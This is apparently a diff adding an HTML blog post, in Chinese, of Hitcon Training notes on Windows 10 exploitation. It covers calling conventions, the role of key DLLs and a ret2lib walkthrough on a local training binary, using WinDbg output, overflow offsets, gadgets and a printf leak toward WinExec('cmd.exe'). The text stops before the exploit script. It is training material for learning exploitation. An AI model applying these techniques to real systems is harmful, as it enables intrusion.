@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="之前上了Hitcon Training
+特別做一下筆記，真的蠻有趣的
+Base knowledgeCalling conventionLinux版:https://sda06407.github.io/2018/08/25/calling_convention/
+windows 的 calling ">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="AStar">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="windows10-pwn-note"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="AStar&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+        <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>windows10-pwn-note - AStar&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+	
+</head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">AStar</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/tags">
+                            
+                                Tags
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories">
+                            
+                                Categories
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://github.com/klugjo/hexo-theme-clean-blog">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>windows10-pwn-note</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2021-05-23
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>之前上了Hitcon Training</p>
+<p>特別做一下筆記，真的蠻有趣的</p>
+<h1 id="Base-knowledge"><a href="#Base-knowledge" class="headerlink" title="Base knowledge"></a>Base knowledge</h1><h2 id="Calling-convention"><a href="#Calling-convention" class="headerlink" title="Calling convention"></a>Calling convention</h2><p>Linux版:<a href="https://sda06407.github.io/2018/08/25/calling_convention/" target="_blank" rel="noopener">https://sda06407.github.io/2018/08/25/calling_convention/</a></p>
+<p>windows 的 calling convention 跟Linux的還是有不一樣</p>
+<p>順序基本上一樣，差在存 argv 的register不一樣</p>
+<p>存argv的register的順序為: <code>rcx</code> <code>rdx</code> <code>r8</code> <code>r9</code> <code>rsp+0x20</code> …</p>
+<p>一樣先附上圖片</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_2.PNG" alt=""></p>
+<p>assamlby:</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_1.PNG" alt=""></p>
+<h2 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h2><h3 id="Dynamic-Link-Library"><a href="#Dynamic-Link-Library" class="headerlink" title="Dynamic-Link Library"></a>Dynamic-Link Library</h3><p> 動態連結函示庫，將常用的程式碼(function)做成lib檔，當程式需要用的時候才載入到記憶體中，大幅減少程式的大小，在不同環境中的可移植性也提高(ex.printf)</p>
+<h3 id="Windows-中重要的DLL"><a href="#Windows-中重要的DLL" class="headerlink" title="Windows 中重要的DLL"></a>Windows 中重要的DLL</h3><ol>
+<li>ntdll.dll<ul>
+<li>Windows native api<ul>
+<li>主要與kernel溝通的入口，其最後都會去呼叫 system call</li>
+</ul>
+</li>
+<li>大部分API 都是以 Nt 開頭為命名</li>
+<li>一般不會直接被程式呼叫，通常都是dll呼叫他居多</li>
+</ul>
+</li>
+<li>kernelbase.dll<ul>
+<li>Windows 7 之後一些比較核心的 function 會從 kernel32 拆過來這邊</li>
+<li>主要是為了MinWin 而特別分出一個dll</li>
+</ul>
+</li>
+<li>kernel32.dll<ul>
+<li>Windows 中 Libc 的地位</li>
+<li>Exploit 中常常會使用</li>
+<li>提供許多 Win32 api<ul>
+<li>記憶體管理，I/O操作等等，許多最後都由Native API 呈現 (也就是呼叫ntdll)</li>
+<li>VirtualProtect/VirtualAlloc</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>msvcrt.dll<ul>
+<li>Windows 上的 C Library</li>
+<li>大部分的 C function language 都在這實現</li>
+</ul>
+</li>
+</ol>
+<p>以呼叫寫入記憶體這個方法為例</p>
+<p>kernel32 與 kernelbase 之間的關係是這樣</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_3.png" alt=""></p>
+<p>參考:<br><a href="https://zh.wikipedia.org/wiki/Windows%E7%B3%BB%E7%B5%B1%E5%87%BD%E5%BC%8F%E5%BA%AB" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Windows%E7%B3%BB%E7%B5%B1%E5%87%BD%E5%BC%8F%E5%BA%AB</a><br><a href="https://www.itsfun.com.tw/ntdll.dll/wiki-5476781-9374771" target="_blank" rel="noopener">https://www.itsfun.com.tw/ntdll.dll/wiki-5476781-9374771</a><br><a href="https://stackoverflow.com/questions/61769164/windbg-help-missing-kernel32-function" target="_blank" rel="noopener">https://stackoverflow.com/questions/61769164/windbg-help-missing-kernel32-function</a><br><a href="https://github.com/tklengyel/drakvuf/issues/639" target="_blank" rel="noopener">https://github.com/tklengyel/drakvuf/issues/639</a></p>
+<h3 id="Different-from-Linux"><a href="#Different-from-Linux" class="headerlink" title="Different from Linux"></a>Different from Linux</h3><ol>
+<li>dll vs so<ul>
+<li>Linux 的Dynamic Library 是<code>.so</code></li>
+<li>Windows 的 Dynamic Library 是 <code>.dll</code></li>
+</ul>
+</li>
+<li>IAT vs GOT<ul>
+<li>IAT<ul>
+<li>為一個 function 陣列的指標列，儲存於 Library 內，相當於 Linux 的 GOT table</li>
+<li>預設情況下，<code>不會</code>採用lazy binding 機制，也就是在程式 loading 的時候就將記憶體位置填入 IAT 了，因此整個 IAT 表預設是 <code>read-only</code> 的，也就是 Full RELRO</li>
+</ul>
+</li>
+<li>GOT<ul>
+<li>Linux 預設採用 lazy binding, 也就是需要用到 function 的時候才去 libc 找位置並填入 GOT 內，節省了沒有用到 function 的載入時間</li>
+</ul>
+</li>
+<li>Linux 最新版與 Windows 採用相同機制(GCC default) </li>
+</ul>
+</li>
+<li>File Operation<ul>
+<li>在 Linux 底下對於檔案操作是透過 File descriptor (0 = stdin, 1 = stdout, 2=stderr)</li>
+<li>Windows 對於檔案操作是透過 File Handles (HFILE)<ul>
+<li>CreateFile/OpenFile <-> open</-></li>
+<li>ReadFile <-> read</-></li>
+<li>WriteFile <-> write</-></li>
+</ul>
+</li>
+<li>在 <code>msvcrt.dll</code> 裡面有 <code>open/read/write</code>, 與 Linux 的使用方法相同，但可能會有沒 load 這個dll的情況發生，所以還是需要 File Handles</li>
+</ul>
+</li>
+</ol>
+<h1 id="Ret2lib"><a href="#Ret2lib" class="headerlink" title="Ret2lib"></a>Ret2lib</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
+<li>沒有syscall能用</li>
+<li>需要找到 <code>WinExec</code> 或 <code>system</code> 在 <code>kernel32.dll</code> 或 <code>ucrtbase.dll</code> 的位置</li>
+<li>需要找對應 dll 的位置<ul>
+<li>leak IAT 表</li>
+<li>leak stack 內找 dll 的 address (function return 的時候並不會將 stack 內的資料清除)</li>
+<li>Heap structure</li>
+</ul>
+</li>
+<li>因為 ASLR 的緣故，我們必須先 leak dll 內的 function address offset, 這個可以透過 <code>Dll export view</code> 取得</li>
+<li>透過 windbg 可以取得 function 當下的位置，扣除 dll 內 function address offset 就可以取得 base address</li>
+<li>將 base address 加上任意的 function address offset 就可以得到當下該 function 的真實位置</li>
+<li>為了構 <code>system(&#39;cmd.exe&#39;) / WinExec(&#39;cmd.exe&#39;)</code> 我們還需要 <code>pop rcx;ret</code></li>
+</ul>
+<h2 id="範例題"><a href="#範例題" class="headerlink" title="範例題"></a>範例題</h2><p>因為 Hitcon Training 好像沒辦法外流題目之類的東西， 所以就不貼 source code 了QQ</p>
+<p>執行起來是這樣，可以發現他已經先給我們 main address 了</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_1.png" alt=""></p>
+<p>首先取得了模擬真實pwn題所以架一個 local server run 題目</p>
+<p>首先我們先把 <code>main address</code> recv 起來</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_2.png" alt=""></p>
+<p>再來就是算 overflow 的 offset</p>
+<p>首先用 nc 做連線</p>
+<p>用 Windbg hook pid</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_3.png" alt=""></p>
+<p>hook之後她會停在 <code>int 3</code> 的中斷信號位置</p>
+<p>根據 code 得知第三個input有overflow的情況發生</p>
+<p>所以我先跑到第三個 input<br>但…..</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_4.png" alt=""></p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_5.png" alt=""></p>
+<p>好吧 先給main address XD</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_6.png" alt=""></p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_7.png" alt=""></p>
+<p>看到 Thank you 我還以為失敗了@@</p>
+<p>但看起來有成功</p>
+<p>可以用 <code>k</code> 看 stack 的狀態</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_8.png" alt=""></p>
+<p>取得 gadget 之後可以用  <code>.formats</code> 幫忙做chr()</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_9.png" alt=""></p>
+<p>一開始我還用 <code>caaq</code> 去找 offset 結果給我 1608 後來才發現忘了有 little endian</p>
+<p>應該要用 <code>qaac</code> 去做計算，取得 offset 為 264</p>
+<p>有了 overflow  的 offset 之後</p>
+<p>再來就要求 WinExec 的位置和 <code>pop rcx; ret</code> 的位置</p>
+<p><code>pop rcx; ret</code> 比較簡單所以我想先用，在求之前要先取得 bin base, 也就是透過 main address 取得 bin base</p>
+<p>我們可以透過 <code>!peb</code> 取得 <code>ImageBaseAddress</code>  </p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_11.png" alt=""></p>
+<p>再把 main address 扣除 ImageBaseAddress 取得 offset <code>0x10f0</code></p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_12.png" alt=""></p>
+<p>再來需要取得 IAT 表</p>
+<p>透過 <code>!dh ret2lib.exe</code> 可以取得 IAT 在 bin base + 0x2000 之處 (Import Address Table Directory)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">0:003&gt; !dh ret2lib.exe</span><br><span class="line"></span><br><span class="line">File Type: EXECUTABLE IMAGE</span><br><span class="line">FILE HEADER VALUES</span><br><span class="line">    8664 machine (X64)</span><br><span class="line">       6 number of sections</span><br><span class="line">5F1EDE1B time date stamp Mon Jul 27 07:00:59 2020</span><br><span class="line"></span><br><span class="line">       0 file pointer to symbol table</span><br><span class="line">       0 number of symbols</span><br><span class="line">      F0 size of optional header</span><br><span class="line">      22 characteristics</span><br><span class="line">            Executable</span><br><span class="line">            App can handle &gt;2gb addresses</span><br><span class="line"></span><br><span class="line">OPTIONAL HEADER VALUES</span><br><span class="line">     20B magic #</span><br><span class="line">   14.26 linker version</span><br><span class="line">     E00 size of code</span><br><span class="line">    1800 size of initialized data</span><br><span class="line">       0 size of uninitialized data</span><br><span class="line">    1470 address of entry point</span><br><span class="line">    1000 base of code</span><br><span class="line">         ----- new -----</span><br><span class="line">00007ff682f10000 image base</span><br><span class="line">    1000 section alignment</span><br><span class="line">     200 file alignment</span><br><span class="line">       3 subsystem (Windows CUI)</span><br><span class="line">    6.00 operating system version</span><br><span class="line">    0.00 image version</span><br><span class="line">    6.00 subsystem version</span><br><span class="line">    7000 size of image</span><br><span class="line">     400 size of headers</span><br><span class="line">       0 checksum</span><br><span class="line">0000000000100000 size of stack reserve</span><br><span class="line">0000000000001000 size of stack commit</span><br><span class="line">0000000000100000 size of heap reserve</span><br><span class="line">0000000000001000 size of heap commit</span><br><span class="line">    8160  DLL characteristics</span><br><span class="line">            High entropy VA supported</span><br><span class="line">            Dynamic base</span><br><span class="line">            NX compatible</span><br><span class="line">            Terminal server aware</span><br><span class="line">       0 [       0] address [size] of Export Directory</span><br><span class="line">    28CC [      B4] address [size] of Import Directory</span><br><span class="line">    5000 [     1E0] address [size] of Resource Directory</span><br><span class="line">    4000 [     15C] address [size] of Exception Directory</span><br><span class="line">       0 [       0] address [size] of Security Directory</span><br><span class="line">    6000 [      24] address [size] of Base Relocation Directory</span><br><span class="line">    2358 [      70] address [size] of Debug Directory</span><br><span class="line">       0 [       0] address [size] of Description Directory</span><br><span class="line">       0 [       0] address [size] of Special Directory</span><br><span class="line">       0 [       0] address [size] of Thread Storage Directory</span><br><span class="line">    23D0 [     130] address [size] of Load Configuration Directory</span><br><span class="line">       0 [       0] address [size] of Bound Import Directory</span><br><span class="line">    2000 [     1B0] address [size] of Import Address Table Directory</span><br><span class="line">       0 [       0] address [size] of Delay Import Directory</span><br><span class="line">       0 [       0] address [size] of COR20 Header Directory</span><br><span class="line">       0 [       0] address [size] of Reserved Directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECTION HEADER #1</span><br><span class="line">   .text name</span><br><span class="line">     D4C virtual size</span><br><span class="line">    1000 virtual address</span><br><span class="line">     E00 size of raw data</span><br><span class="line">     400 file pointer to raw data</span><br><span class="line">       0 file pointer to relocation table</span><br><span class="line">       0 file pointer to line numbers</span><br><span class="line">       0 number of relocations</span><br><span class="line">       0 number of line numbers</span><br><span class="line">60000020 flags</span><br><span class="line">         Code</span><br><span class="line">         (no align specified)</span><br><span class="line">         Execute Read</span><br><span class="line"></span><br><span class="line">SECTION HEADER #2</span><br><span class="line">  .rdata name</span><br><span class="line">     FA4 virtual size</span><br><span class="line">    2000 virtual address</span><br><span class="line">    1000 size of raw data</span><br><span class="line">    1200 file pointer to raw data</span><br><span class="line">       0 file pointer to relocation table</span><br><span class="line">       0 file pointer to line numbers</span><br><span class="line">       0 number of relocations</span><br><span class="line">       0 number of line numbers</span><br><span class="line">40000040 flags</span><br><span class="line">         Initialized Data</span><br><span class="line">         (no align specified)</span><br><span class="line">         Read Only</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Debug Directories(4)</span><br><span class="line">	Type       Size     Address  Pointer</span><br><span class="line">	cv           57        2500     1700	Format: RSDS, guid, 2, C:\Users\angelboy\source\repos\ret2lib\x64\Release\ret2lib.pdb</span><br><span class="line">	(    12)      14        2558     1758</span><br><span class="line">	(    13)     26c        256c     176c</span><br><span class="line">	(    14)       0           0        0</span><br><span class="line"></span><br><span class="line">SECTION HEADER #3</span><br><span class="line">   .data name</span><br><span class="line">      E0 virtual size</span><br><span class="line">    3000 virtual address</span><br><span class="line">     200 size of raw data</span><br><span class="line">    2200 file pointer to raw data</span><br><span class="line">       0 file pointer to relocation table</span><br><span class="line">       0 file pointer to line numbers</span><br><span class="line">       0 number of relocations</span><br><span class="line">       0 number of line numbers</span><br><span class="line">C0000040 flags</span><br><span class="line">         Initialized Data</span><br><span class="line">         (no align specified)</span><br><span class="line">         Read Write</span><br><span class="line"></span><br><span class="line">SECTION HEADER #4</span><br><span class="line">  .pdata name</span><br><span class="line">     15C virtual size</span><br><span class="line">    4000 virtual address</span><br><span class="line">     200 size of raw data</span><br><span class="line">    2400 file pointer to raw data</span><br><span class="line">       0 file pointer to relocation table</span><br><span class="line">       0 file pointer to line numbers</span><br><span class="line">       0 number of relocations</span><br><span class="line">       0 number of line numbers</span><br><span class="line">40000040 flags</span><br><span class="line">         Initialized Data</span><br><span class="line">         (no align specified)</span><br><span class="line">         Read Only</span><br><span class="line"></span><br><span class="line">SECTION HEADER #5</span><br><span class="line">   .rsrc name</span><br><span class="line">     1E0 virtual size</span><br><span class="line">    5000 virtual address</span><br><span class="line">     200 size of raw data</span><br><span class="line">    2600 file pointer to raw data</span><br><span class="line">       0 file pointer to relocation table</span><br><span class="line">       0 file pointer to line numbers</span><br><span class="line">       0 number of relocations</span><br><span class="line">       0 number of line numbers</span><br><span class="line">40000040 flags</span><br><span class="line">         Initialized Data</span><br><span class="line">         (no align specified)</span><br><span class="line">         Read Only</span><br><span class="line"></span><br><span class="line">SECTION HEADER #6</span><br><span class="line">  .reloc name</span><br><span class="line">      24 virtual size</span><br><span class="line">    6000 virtual address</span><br><span class="line">     200 size of raw data</span><br><span class="line">    2800 file pointer to raw data</span><br><span class="line">       0 file pointer to relocation table</span><br><span class="line">       0 file pointer to line numbers</span><br><span class="line">       0 number of relocations</span><br><span class="line">       0 number of line numbers</span><br><span class="line">42000040 flags</span><br><span class="line">         Initialized Data</span><br><span class="line">         Discardable</span><br><span class="line">         (no align specified)</span><br><span class="line">         Read Only</span><br></pre></td></tr></table></figure>
+<p>透過 <code>dq</code> 去看記憶體裡面的hex</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_13.png" alt=""></p>
+<p>這就是 Windows 版的GOT，問題在於說，這些 address 個別是指向哪個 function 呢?</p>
+<p>還好 PE Bear 可以幫我們做識別@@</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_14.png" alt=""></p>
+<p>這邊我選 <code>RtlLookupFunctionEntry</code> ，用這個 funhction 幫我們找到 kernel32 的 base address<br>可以先用 windbg 幫我們做 double check</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_15.png" alt=""></p>
+<p>只有一行的原因可能是之後會跳到 <code>kernelbase.dll</code> 在跳到 <code>ntdll.dll</code> </p>
+<p>透過 <code>Dll export view</code> 可以取得 <code>RtlLookupFunctionEntry</code> 的 offset</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_16.png" alt=""></p>
+<p>扣除 <code>Relative address</code> 後就能得到 kernel32 的 base address 了</p>
+<p>再加上 WinExec 的 offset 就能得到 <code>WinExec</code> 的真實位置了</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_17.png" alt=""></p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_18.png" alt=""></p>
+<p>最後透過 objdump 可以看到在 <code>140001054</code> 處剛好有一個 <code>pop rcx; ret</code><br><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_19.png" alt=""></p>
+<p>.text section 的 address 可以透過上面的 <code>!dh ret2lib.exe</code> 取得，<br>或是可以用 <code>!dh -s ret2lib.exe</code> 只列出 <code>section</code> 的部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SECTION HEADER #1</span><br><span class="line">   .text name</span><br><span class="line">     D4C virtual size</span><br><span class="line">    1000 virtual address</span><br><span class="line">     E00 size of raw data</span><br><span class="line">     400 file pointer to raw data</span><br><span class="line">       0 file pointer to relocation table</span><br><span class="line">       0 file pointer to line numbers</span><br><span class="line">       0 number of relocations</span><br><span class="line">       0 number of line numbers</span><br><span class="line">60000020 flags</span><br><span class="line">         Code</span><br><span class="line">         (no align specified)</span><br><span class="line">         Execute Read</span><br></pre></td></tr></table></figure>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_20.png" alt=""></p>
+<p>最後還忘了要找 Name 儲存的地方…</p>
+<p>因為我有 source code, 所以我知道 main call 的第七個 function 會是一個 <code>read</code>, 這個 read 會把我們輸入的字串存入 Name</p>
+<p>因為我們有了 .text 區段的 offset, 所以也可以很輕易地透過 <code>objdump</code> 取得 main address</p>
+<p><img src="/img/2020/windows_pwn/windows_pwn_ret2lib_21.png" alt=""> </p>
+<p>因為第七個看起來比較像 <code>puts</code>, 第八個比較像，可能他前面多call了什麼吧，或是可以透過 windbg 去做 double check, 但我懶了…</p>
+<p>總之就把 <code>0x1400030b0</code> 當成存放 Name 的位置吧</p>
+<p>現在我們取得所有必要的 offset 了，那最重要的 leak 要怎麼做呢?</p>
+<p>在 Linux PWN, 我都習慣用 puts, 主要也是因為 gcc 預設會把 <code>printf</code> 優化為 <code>puts</code> (如果僅輸出字串的話)<br>所以找到 <code>puts</code> 的機率比起 <code>printf</code> 還大</p>
+<p>但因為 windows 不像 linux 有 PLT Table 可以直接將 rip 控到一個 address 之後幫我們跳到該 function 的真實位置</p>
+<p>所以 透過 puts leak 這件事變成一件難題</p>
+<p>所以我們需要透過 printf 去做 leak, 蛤? 為什麼 puts 不行 printf 卻可以嗎</p>
+<p>用個圖來說明</p>
+<p><img src="/img/2020/windows_pwn/puts_printf.png" alt=""></p>
+<p><code>puts</code> 的 function entry point 在 <code>ucrtbase.dll</code> 裡面<br>而 <code>printf</code> 的則在 binary裡面</p>
+<p>這一來一往差在如果用 <code>puts</code> leak 的話需要先 leak ucrtbase.dll 的 base address</p>
+<p>實際追 address 之後發現 <code>puts</code> 的 function entry 是直接跳到 <code>ucrtbase!puts</code><br>所以如果把 rip 指向 puts 的 IAT address 會直接把 <code>ucrtbase!puts</code> 的 address 當成 assambly 執行</p>
+<p><img src="/img/2020/windows_pwn/puts_printf_1.png" alt=""></p>
+<p>而 <code>printf</code> 呢? 可以看到他先 call 了 <code>acrt_iob_func(1)</code> 再 call <code>vprintf</code></p>
+<p><img src="/img/2020/windows_pwn/puts_printf_2.png" alt=""></p>
+<p>而 <code>acrt_iob_func</code> 就是 linux 的 File descriptor</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In visual studio 2015, stdin, stderr, stdout are defined as follow :</span><br><span class="line"></span><br><span class="line">#define stdin  (__acrt_iob_func(0))</span><br><span class="line">#define stdout (__acrt_iob_func(1))</span><br><span class="line">#define stderr (__acrt_iob_func(2))</span><br><span class="line">But previously, they were defined as:</span><br><span class="line"></span><br><span class="line">#define stdin  (&amp;__iob_func()[0])</span><br><span class="line">#define stdout (&amp;__iob_func()[1])</span><br><span class="line">#define stderr (&amp;__iob_func()[2])</span><br></pre></td></tr></table></figure>
+<p><a href="https://stackoverflow.com/questions/30412951/unresolved-external-symbol-imp-fprintf-and-imp-iob-func-sdl2" target="_blank" rel="noopener">https://stackoverflow.com/questions/30412951/unresolved-external-symbol-imp-fprintf-and-imp-iob-func-sdl2</a></p>
+<p>而且重點是他後面還接了一個 <code>ret</code> 這使我們的 payload 可以繼續進行</p>
+<p>搞定了最後的 leak 之後開始寫 exploit</p>
+<p>一開始是寫這樣子:</p>
